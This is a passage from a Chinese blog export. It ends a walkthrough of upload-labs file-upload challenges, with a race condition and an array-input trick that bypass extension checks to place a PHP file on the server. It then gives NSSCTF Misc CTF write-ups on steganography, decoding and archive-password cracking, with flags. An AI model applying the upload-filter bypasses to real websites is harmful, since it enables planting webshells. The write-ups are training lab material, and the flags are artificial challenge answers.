title="Pass-18"></a>Pass-18</h2><p>上传图片马包含可以过关</p><p>同样的，也可以通过条件竞争</p><p>和上一个pass一样的方法，但是源码对文件名和文件头都做了检查，我们取一个无法解析的文件名phpinfo.php.7z</p><p><img src="https://imag.keyblue.cn/imag/202309201243396.png" alt="image-20230920124307328"></p><p>需要注意的是，本pass上传的文件并不在upload目录下，而是在网站根目录</p><p><img src="https://imag.keyblue.cn/imag/202309201245964.png" alt="image-20230920124524925"></p><p>查看网站根目录，发现phpinfo.php被创建</p><p><img src="https://imag.keyblue.cn/imag/202309201247415.png" alt="image-20230920124714389"></p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>需要Linux环境，懒得配🤤</p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>审计代码，发现可以利用数组绕过</p><p><img src="https://imag.keyblue.cn/imag/202309201337886.png" alt="image-20230920133710856"></p><p>如果传入数组，<code>$file = explode(&#39;.&#39;, strtolower($file));</code>会失去作用，同时<code>$ext = end($file);</code>的作用是返回数组的最后一位也可以随意绕过，同时可将<code>$file[count($file) - 1]</code>为空</p><p><img src="https://imag.keyblue.cn/imag/202309201341007.png" alt="image-20230920134126963"></p><p>如上图上传后，因为<code>$file[count($file) - 1]</code>为空，所以<code>$file_name</code>会等于<code>phpinfo.php.</code>,但<code>move_uploaded_file()</code>在保存时会忽略<code>.</code>,所以最后的文件名称为<code>phpinfo.php</code></p><p><img src="https://imag.keyblue.cn/imag/202309201345594.png" alt="image-20230920134543570"></p><p>THE END</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF Misc模块做题记录</title>
      <link href="/2023/08/29/NSSCTF%20Misc%E6%A8%A1%E5%9D%97%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/08/29/NSSCTF%20Misc%E6%A8%A1%E5%9D%97%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN-2018-Picture"><a href="#CISCN-2018-Picture" class="headerlink" title="[CISCN 2018]Picture"></a>[CISCN 2018]Picture</h1><p>打开是一张图片，binwalk解压得到两个文件</p><p><img src="https://imag.keyblue.cn/imag/202309061407818.png" alt="image-20230906140725773"></p><p>其中一个是base64编码</p><p><img src="https://imag.keyblue.cn/imag/202309061408316.png" alt="image-20230906140828293"></p><p>解码发现神似压缩包，此时不要直接复制解码后的明文，打开010新建一个空文本，选择粘贴自base64。因为使用别的软件可能会出现一些问题</p><p><img src="https://imag.keyblue.cn/imag/202309061413984.png" alt="image-20230906141311956"></p><p>将文件头修复</p><p><img src="https://imag.keyblue.cn/imag/202309061414808.png" alt="image-20230906141457788"></p><p>用7z打开，但是解压文件需要密码，bing搜索报错信息<code>ZeroDivisionError:</code></p><p><img src="https://imag.keyblue.cn/imag/202309061416489.png" alt="image-20230906141650461"></p><p>搜到多个报错</p><p><img src="https://imag.keyblue.cn/imag/202309061417479.png" alt="image-20230906141758459"></p><p>最终解压密码为</p><pre class="line-numbers language-none"><code class="language-none">integer division or modulo by zero<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开code文件，是uucode编码，</p><p><img src="https://imag.keyblue.cn/imag/202309061419615.png" alt="image-20230906141943595"></p><p>解码</p><p><img src="https://imag.keyblue.cn/imag/202309061420818.png" alt="image-20230906142011796"></p><pre class="line-numbers language-none"><code class="language-none">CISCN&#123;2388AF2893EB85EB1B439ABFF617319F&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="CISCN-2023-初赛-被加密的生产流量"><a href="#CISCN-2023-初赛-被加密的生产流量" class="headerlink" title="[CISCN 2023 初赛]被加密的生产流量"></a>[CISCN 2023 初赛]被加密的生产流量</h1><p>第一次接触工控流量</p><p>追踪TCP流，这个流量有点奇特</p><p><img src="https://imag.keyblue.cn/imag/202309051431254.png" alt="image-20230905143101208"></p><p>记录下来</p><pre class="line-numbers language-none"><code class="language-none">MMYWMX3GNEYWOXZRGAYDA&#x3D;&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用base32解码</p><p><img src="https://imag.keyblue.cn/imag/202309051439997.png" alt="image-20230905143923959"></p><pre class="line-numbers language-none"><code class="language-none">c1f_fi1g_1000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="GDOUCTF-2023-pixelart"><a href="#GDOUCTF-2023-pixelart" class="headerlink" title="[GDOUCTF 2023]pixelart"></a>[GDOUCTF 2023]pixelart</h1><p>打开压缩包，是一张图片，图片有点大。。。</p><p><img src="https://imag.keyblue.cn/imag/202309041327813.png" alt="arcaea"></p><p>用010打开图片，有隐藏的信息<code>320x180</code></p><p><img src="https://imag.keyblue.cn/imag/202309041332426.png" alt="image-20230904133237393"></p><p>放大图片仔细看，可以看到flag被使用白点写在图片上</p><p><img src="https://imag.keyblue.cn/imag/202309041335333.png" alt="image-20230904133506226"></p><p>放大图片记录，原来这是假的flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;fake_flag&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现图片上还有其他的像素点，原图大小<code>3840x2160</code>，根据之前给出的线索<code>320x180</code>我们可以知道每一个像素点之间的距离为12</p><p>这里需要用到python脚本来实现把图片像素化</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imageoriginal_image <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'res/arcaea.png'</span><span class="token punctuation">)</span>new_width <span class="token operator">=</span> original_image<span class="token punctuation">.</span>width <span class="token operator">//</span> <span class="token number">12</span>new_height <span class="token operator">=</span> original_image<span class="token punctuation">.</span>height <span class="token operator">//</span> <span class="token number">12</span>new_image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span><span class="token punctuation">(</span>new_width<span class="token punctuation">,</span>new_height<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>new_width<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>new_height<span class="token punctuation">)</span><span class="token punctuation">:</span>        pixel <span class="token operator">=</span> original_image<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">*</span><span class="token number">12</span><span class="token punctuation">,</span>y<span class="token operator">*</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        new_image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span>pixel<span class="token punctuation">)</span>new_image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"flag.png"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309041428100.png" alt="flag"></p><p>然后可以使用zsteg查看图片隐写</p><p><img src="https://imag.keyblue.cn/imag/202309041431243.png" alt="image-20230904143120214"></p><p>也可以使用stegsolve查看</p><p><img src="https://imag.keyblue.cn/imag/202309041432780.png" alt="image-20230904143206750"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;J3st_2_cats_battling&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="HDCTF-2023-hardMisc"><a href="#HDCTF-2023-hardMisc" class="headerlink" title="[HDCTF 2023]hardMisc"></a>[HDCTF 2023]hardMisc</h1><p> 打开压缩包，是个图片</p><p><img src="https://imag.keyblue.cn/imag/202308301218216.png" alt="image-20230830121850165"></p><p>直接拉到kali分离</p><p><img src="https://imag.keyblue.cn/imag/202308301219218.png" alt="image-20230830121950171"></p><p>没有东西，随机使用010打开</p><p><img src="https://imag.keyblue.cn/imag/202308301220202.png" alt="image-20230830122057163"></p><p>内容如下</p><pre class="line-numbers language-none"><code class="language-none">SERDVEZ7d0UxYzB3M18xMF9IRGN0Zl9NMTVjfQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解码就是flag：HDCTF{wE1c0w3_10_HDctf_M15c}</p><h1 id="HUBUCTF-2022-新生赛-最简单的misc"><a href="#HUBUCTF-2022-新生赛-最简单的misc" class="headerlink" title="[HUBUCTF 2022 新生赛]最简单的misc"></a>[HUBUCTF 2022 新生赛]最简单的misc</h1><p>打开文件是一个图片</p><p><img src="https://imag.keyblue.cn/imag/202308311029117.png" alt="image-20230831102912950"></p><p>直接用010打开图片，没有发现</p><p>把文件拉到kali进行分离，没有发现</p><p>zsteg测试，发现lsb隐写</p><p><img src="https://imag.keyblue.cn/imag/202308311042725.png" alt="image-20230831104259676"></p><p>直接使用命令提取</p><p><img src="https://imag.keyblue.cn/imag/202308311046549.png" alt="image-20230831104659519"></p><p>打开1.png发现是个二维码</p><p><img src="https://imag.keyblue.cn/imag/202308311047211.png" alt="image-20230831104731175"></p><p>使用CaptfEncoder解码</p><p><img src="https://imag.keyblue.cn/imag/202308311048413.png" alt="image-20230831104856358"></p><p>flag：</p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;aacc4238460996f0178c18d7637c9dd5&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="LitCTF-2023-404notfound-初级"><a href="#LitCTF-2023-404notfound-初级" class="headerlink" title="[LitCTF 2023]404notfound (初级)"></a>[LitCTF 2023]404notfound (初级)</h1><p>解压之后是一个图片</p><p><img src="https://imag.keyblue.cn/imag/202308281011008.png" alt="image-20230828101118969"></p><p>binwalk分离无果</p><p>用010打开图片，拉到最后，没有发现有用的信息</p><p>在kali里使用strings命令查看</p><p><img src="https://imag.keyblue.cn/imag/202308281022205.png" alt="image-20230828102243162"></p><p>发现flag值：LitCTF{Its_404_but_1ts_n0t_a_page}</p><h1 id="LitCTF-2023-Osint小麦果汁"><a href="#LitCTF-2023-Osint小麦果汁" class="headerlink" title="[LitCTF 2023]Osint小麦果汁"></a>[LitCTF 2023]Osint小麦果汁</h1><p>使用binwalk分离，没有成果</p><p>010打开没有发现有用的信息</p><p>涉及到知识盲区了，果断看WP，原来是社工题，</p><p>根据墙上的wifi名称可以搜索到店名</p><pre class="line-numbers language-none"><code class="language-none">黑客与精酿<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="LitCTF-2023-Take-me-hand-初级"><a href="#LitCTF-2023-Take-me-hand-初级" class="headerlink" title="[LitCTF 2023]Take me hand (初级)"></a>[LitCTF 2023]Take me hand (初级)</h1><p>打开流量包过滤http</p><p><img src="https://imag.keyblue.cn/imag/202308291318257.png" alt="image-20230829131841214"></p><p>点开其中一个请求包可以看到请求内容就是flag</p><p><img src="https://imag.keyblue.cn/imag/202308291319812.png" alt="image-20230829131929775"></p><p>LitCTF{Give_y0ur_hand_to_me!!!_plz}</p><h1 id="LitCTF-2023-破损的图片-初级"><a href="#LitCTF-2023-破损的图片-初级" class="headerlink" title="[LitCTF 2023]破损的图片(初级)"></a>[LitCTF 2023]破损的图片(初级)</h1><p>打开压缩包，里面是一个没有后缀名的文件</p><p><img src="https://imag.keyblue.cn/imag/202308311304019.png" alt="image-20230831130438973"></p><p>用010打开，发现文件头缺失了</p><p><img src="https://imag.keyblue.cn/imag/202308311306601.png" alt="image-20230831130655578"></p><p>修复文件头</p><p><img src="https://imag.keyblue.cn/imag/202308311311610.png" alt="image-20230831131123578"></p><p>成功打开文件</p><p><img src="https://imag.keyblue.cn/imag/202308311311413.png" alt="image-20230831131146253"></p><p>flag</p><pre class="line-numbers language-none"><code class="language-none">LitCTF&#123;May you, the beauty of this world, always shine.&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="LitCTF-2023-这羽毛球怎么只有一半啊（恼-初级"><a href="#LitCTF-2023-这羽毛球怎么只有一半啊（恼-初级" class="headerlink" title="[LitCTF 2023]这羽毛球怎么只有一半啊（恼 (初级)"></a>[LitCTF 2023]这羽毛球怎么只有一半啊（恼 (初级)</h1><p>图片只有一半</p><p><img src="https://imag.keyblue.cn/imag/202308281057421.png" alt="image-20230828105727274"></p><p>应该是要爆破图片宽高</p><p>010直接更改图片高度，保存打开图片可以看到完整图片了</p><p><img src="https://imag.keyblue.cn/imag/202308281152722.png" alt="image-20230828115241690"></p><p><img src="https://imag.keyblue.cn/imag/202308281154576.png" alt="image-20230828115419501"></p><p><img src="https://imag.keyblue.cn/imag/202308281154939.png" alt="image-20230828115441917"></p><p>LitCTF{Fl4g_0fcourse!}</p><h1 id="NISACTF-2022-bilala的二维码"><a href="#NISACTF-2022-bilala的二维码" class="headerlink" title="[NISACTF 2022]bilala的二维码"></a>[NISACTF 2022]bilala的二维码</h1><p>binwalk分离，无果</p><p>010查看无果</p><p>只能补全二维码了</p><p><img src="https://imag.keyblue.cn/imag/202309041707302.png" alt="bilala1QRcode"></p><p>使用画图工具补全三个定位角</p><p><img src="https://imag.keyblue.cn/imag/202309041708988.png" alt="image-20230904170841950"></p><p>再使用QRResearch工具扫描二维码</p><p><img src="https://imag.keyblue.cn/imag/202309041709479.png" alt="image-20230904170921451"></p><p>访问解码出来的链接，下载网页中的图片。</p><p>foremost分离出来一个压缩包<img src="https://imag.keyblue.cn/imag/202309041714621.png" alt="image-20230904171439602"></p><p>拉到windows下，需要密码才能解开</p><p>用ARCHPR爆破</p><p><img src="https://imag.keyblue.cn/imag/202309041941238.png" alt="image-20230904194142210"></p><p>压缩包密码<code>NiSA</code></p><p><img src="https://imag.keyblue.cn/imag/202309041946508.png" alt="image-20230904194632489"></p><p>用Audacity打开mp3文件，是音频隐写</p><p><img src="https://imag.keyblue.cn/imag/202309041946815.png" alt="image-20230904194650780"></p><pre class="line-numbers language-none"><code class="language-none">.--. .- .-. - .---- ---... -- ----- .-. ... ...-- ....- -. -..<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解码得到</p><pre class="line-numbers language-none"><code class="language-none">PART1:M0RS34ND<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是flag的前半段，这里还要加上一个图片的分辨率</p><p>是通过foremost分离出来的另外一张图片</p><p><img src="https://imag.keyblue.cn/imag/202309042003974.png" alt="image-20230904200352949"></p><p><img src="https://imag.keyblue.cn/imag/202309042004577.png" alt="image-20230904200422559"></p><p>这另外半段可真是****</p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;M0RS34ND282X231&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="NISACTF-2022-bmpnumber"><a href="#NISACTF-2022-bmpnumber" class="headerlink" title="[NISACTF 2022]bmpnumber"></a>[NISACTF 2022]bmpnumber</h1><p>题目的附件图片名称为wb4，且为bmp文件</p><p>这是在提示使用wbStego4open</p><p><img src="https://imag.keyblue.cn/imag/202309051322583.png" alt="image-20230905132210543"></p><p>分离出一个破损的二维码图片</p><p><img src="https://imag.keyblue.cn/imag/202309051323330.png" alt="image-20230905132305306"></p><p>我们使用windows画图工具修复三个定位角后解码</p><p><img src="https://imag.keyblue.cn/imag/202309051324939.png" alt="image-20230905132451908"></p><p>访问解码后得到的链接，提示需要密码</p><p><img src="https://imag.keyblue.cn/imag/202309051325353.png" alt="image-20230905132545321"></p><p>看了前面的步骤都没有密码提示，网页提示weak，可能是弱口令，最后猜密码是<code>password</code></p><p>是一个docx文件，打开文档，全选改字体颜色看有没有透明字，发现flag就在最后</p><p><img src="https://imag.keyblue.cn/imag/202309051345963.png" alt="image-20230905134519938"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;this_is_you_need_flag!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="NISACTF-2022-bqt先"><a href="#NISACTF-2022-bqt先" class="headerlink" title="[NISACTF 2022]bqt先"></a>[NISACTF 2022]bqt先</h1><p>先拉到kali里查看文件类型</p><p><img src="https://imag.keyblue.cn/imag/202308281614423.png" alt="image-20230828161452394"></p><p>是一个pdf文件</p><p>binwalk分离无果</p><p>使用010打开文件，没有发现有用的信息</p><p>最后打开pdf文件查看，使用ctrl+A全选，发现文档中间有内容，复制查看</p><pre class="line-numbers language-none"><code class="language-none">c8e9aca0c3f4e6e5f2a1a0d4e8e5a0e6ece1e7a0e9f3baa0e6ece1e7fbf7e5e6e5efe9e4eae7efe5e4f3e6e9eff2f0e5e6e4e6e7e7e6e4f3e5fd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>每间隔两个字符加个空格</p><pre class="line-numbers language-none"><code class="language-none">c8 e9 ac a0 c3 f4 e6 e5 f2 a1 a0 d4 e8 e5 a0 e6 ec e1 e7 a0 e9 f3 ba a0 e6 ec e1 e7 fb f7 e5 e6 e5 ef e9 e4 ea e7 ef e5 e4 f3 e6 e9 ef f2 f0 e5 e6 e4 e6 e7 e7 e6 e4 f3 e5 fd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>转换成10进制</p><pre class="line-numbers language-none"><code class="language-none">200 233 172 160 195 244 230 229 242 161 160 212 232 229 160 230 236 225 231 160 233 243 186 160 230 236 225 231 251 247 229 230 229 239 233 228 234 231 239 229 228 243 230 233 239 242 240 229 230 228 230 231 231 230 228 243 229 253<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为flag一般最后一个字符是}</p><p>}字符的ASCII码序号是125</p><p>253-125&#x3D;128，可以每个字符减128试试</p><pre class="line-numbers language-none"><code class="language-none">72 105 44 32 67 116 102 101 114 33 32 84 104 101 32 102 108 97 103 32 105 115 58 32 102 108 97 103 123 119 101 102 101 111 105 100 106 103 111 101 100 115 102 105 111 114 112 101 102 100 102 103 103 102 100 115 101 125<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ascll解码得到</p><pre class="line-numbers language-none"><code class="language-none">Hi, Ctfer! The flag is: flag&#123;wefeoidjgoedsfiorpefdfggfdse&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>恶心~</p><p>一般flag都是用}结尾的  }的ascii十进制值为125</p><h1 id="NISACTF-2022-huaji？"><a href="#NISACTF-2022-huaji？" class="headerlink" title="[NISACTF 2022]huaji？"></a>[NISACTF 2022]huaji？</h1><p>使用binwalk进行分离</p><p><img src="https://imag.keyblue.cn/imag/202308271206557.png" alt="image-20230827120618515"></p><p>得到的压缩包需要密码解压</p><p><img src="https://imag.keyblue.cn/imag/202308271208655.png" alt="image-20230827120802621"></p><p>找不到密码，在原图片上看看，发现huaji？的属性里有一串奇怪的字符<code>6374665f4e4953415f32303232</code></p><p><img src="https://imag.keyblue.cn/imag/202308271216203.png" alt="image-20230827121638167"></p><p>对其进行ascll解码得到<code>ctf_NISA_2022</code></p><p><img src="https://imag.keyblue.cn/imag/202308271218072.png" alt="image-20230827121857045"></p><p>使用解码字符对压缩包解压缩，得到flag值<code>flag&#123;Nls@_FumYEnnOjy&#125;</code></p><h1 id="NISACTF-2022-为什么我什么都看不见"><a href="#NISACTF-2022-为什么我什么都看不见" class="headerlink" title="[NISACTF 2022]为什么我什么都看不见"></a>[NISACTF 2022]为什么我什么都看不见</h1><p>使用010打开文件，破损的PNG文件头，补好</p><p><img src="https://imag.keyblue.cn/imag/202308271735376.png" alt="image-20230827173547339"></p><p>然后给文件加上后缀</p><p>在kali使用zsteg查看隐写</p><p><img src="https://imag.keyblue.cn/imag/202308271737376.png" alt="image-20230827173729331"></p><p>得到flag值NISA{Wlec0me_to_NiSa2022}</p><h1 id="NISACTF-2022-流量包里有个熊"><a href="#NISACTF-2022-流量包里有个熊" class="headerlink" title="[NISACTF 2022]流量包里有个熊"></a>[NISACTF 2022]流量包里有个熊</h1><p>拿到文件后发现没有后缀，先拉到kali分析</p><p><img src="https://imag.keyblue.cn/imag/202309021611129.png" alt="image-20230902161138093"></p><p>鉴定为pcap文件，随即增加后缀名</p><p>wireshark打开流量包分析，发现有少量HTTP请求</p><p><img src="https://imag.keyblue.cn/imag/202309021618712.png" alt="image-20230902161835678"></p><p>导出被访问的图片</p><p><img src="https://imag.keyblue.cn/imag/202309021619756.png" alt="image-20230902161918732"></p><p>是一头熊，也算是符合题意了，估计flag就在它身上</p><p><img src="https://imag.keyblue.cn/imag/202309021620311.png" alt="image-20230902162019277"></p><p>binwalk分析图片，发现还隐藏着一个RAR压缩包</p><p><img src="https://imag.keyblue.cn/imag/202309021622207.png" alt="image-20230902162210173"></p><p>使用<code>binwalk CuteBear.jpg -e</code>分离压缩包</p><p>压缩包里还有一个小熊图片和两个flag</p><p>对其中一个flag文件进行BASE64解码，这是假的flag</p><p><img src="https://imag.keyblue.cn/imag/202309021627878.png" alt="image-20230902162722845"></p><p>打开另一个文本，没有发现什么，似乎是一段密文，先放着，等会在看</p><p><img src="https://imag.keyblue.cn/imag/202309021702434.png" alt="image-20230902170250395"></p><p>我们把压缩包里的图片再次分离，发现和上一层有点不一样</p><p><img src="https://imag.keyblue.cn/imag/202309021704657.png" alt="image-20230902170405633"></p><p><img src="https://imag.keyblue.cn/imag/202309021704760.png" alt="image-20230902170439740"></p><p>两个个flag.txt和上一层都是一样的，唯一变的是文件夹的名称，文件夹名称变为13，结合那段密文尝试解密，猜测有可能是ROT13加密，随即解密</p><p><img src="https://imag.keyblue.cn/imag/202309021707825.png" alt="image-20230902170716795"></p><p>成功解密，明文开头为FFD8，是JPEG文件没错了，010新建并写入保存为JPG文件</p><p><img src="https://imag.keyblue.cn/imag/202309021709996.png" alt="image-20230902170922965"></p><p>这是原图</p><p><img src="https://imag.keyblue.cn/imag/202309021709673.jpg" alt="Untitled2"></p><p>在此图片上没有发现其他隐藏信息，所以应该是盲水印</p><p>这里使用吾爱破解论坛发布的WaterMark进行查看水印</p><p>这里附工具的下载方式：<a href="https://www.jb51.net/softs/635870.html#downintro2">工具下载</a></p><p><img src="https://imag.keyblue.cn/imag/202309021829796.png" alt="image-20230902182929697"></p><p>图片非常模糊，</p><pre class="line-numbers language-none"><code class="language-none">S0_clev2l_You<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SWPU-2019-Network"><a href="#SWPU-2019-Network" class="headerlink" title="[SWPU 2019]Network"></a>[SWPU 2019]Network</h1><p>TTL隐写</p><pre class="line-numbers language-none"><code class="language-none">IP报文在路由间穿梭的时候每经过一个路由，TTL就会减1，当TTL为0的时候，该报文就会被丢弃。TTL所占的位数是8位，也就是0-255的范围，但是在大多数情况下通常只需要经过很小的跳数就能完成报文的转发，远远比上限255小得多，所以我们可以用TTL值的前两位来进行传输隐藏数据。如：须传送H字符，只需把H字符换成二进制，每两位为一组，每次填充到TTL字段的开头两位并把剩下的6位设置为1（xx111111），这样发4个IP报文即可传送1个字节。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>根据上述规则，可以知道TTL隐写中用到四个值：<code>00 111111</code>（63）,<code>01 111111</code>（127）,<code>10 111111</code>（191）,<code>11 111111</code>（255）,解密的时候只取前两位，然后转换成ascii<br> 简化一下，可以这么认为：<br> 用</p><pre class="line-numbers language-none"><code class="language-none">00 替换 6301 替换 12710 替换 19111 替换 255<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binasciidata <span class="token operator">=</span> <span class="token string">''</span>data_bin <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'res/attachment-2.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>        line <span class="token operator">=</span> line        <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">63</span><span class="token punctuation">:</span>            data_bin <span class="token operator">+=</span> <span class="token string">'00'</span>        <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">127</span><span class="token punctuation">:</span>            data_bin <span class="token operator">+=</span> <span class="token string">'01'</span>        <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">191</span><span class="token punctuation">:</span>            data_bin <span class="token operator">+=</span> <span class="token string">'10'</span>        <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">255</span><span class="token punctuation">:</span>            data_bin <span class="token operator">+=</span> <span class="token string">'11'</span><span class="token keyword">print</span><span class="token punctuation">(</span>data_bin<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data_bin<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>data_bin<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>f2 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result.txt"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span>res <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>data<span class="token punctuation">)</span>f2<span class="token punctuation">.</span>write<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开脚本输出的文件</p><p><img src="https://imag.keyblue.cn/imag/202308311501267.png" alt="image-20230831150148240"></p><p>很明显这是一个zip压缩包</p><p>我们改后缀为zip打开，发现了flag.txt</p><p><img src="https://imag.keyblue.cn/imag/202308311502949.png" alt="image-20230831150252916"></p><p>base64解码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'res/flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">b'flag'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到的flag：</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;189ff9e5b743ae95f940a6ccc6dbd9ab&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SWPU-2019-伟大的侦探"><a href="#SWPU-2019-伟大的侦探" class="headerlink" title="[SWPU 2019]伟大的侦探"></a>[SWPU 2019]伟大的侦探</h1><p>打开压缩包有一个文件夹和一个txt文本</p><p><img src="https://imag.keyblue.cn/imag/202308301859149.png" alt="image-20230830185950098"></p><p>文件夹杯加密了，我们打开<code>密码.txt</code></p><p><img src="https://imag.keyblue.cn/imag/202308301900883.png" alt="image-20230830190032862"></p><p>是两串乱码</p><p>用010打开<code>密码.txt</code>，切换字符集为EBCDIC</p><p><img src="https://imag.keyblue.cn/imag/202308301908474.png" alt="image-20230830190823454"></p><p>得到了：</p><pre class="line-numbers language-none"><code class="language-none">wllm_is_the_best_team!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用这个字符串解压剩下的内容</p><p>是一堆跳舞的小人</p><p><img src="https://imag.keyblue.cn/imag/202308301912749.png" alt="image-20230830191249707"></p><p>解码图</p><p><img src="https://imag.keyblue.cn/imag/202308301934989.jpg" 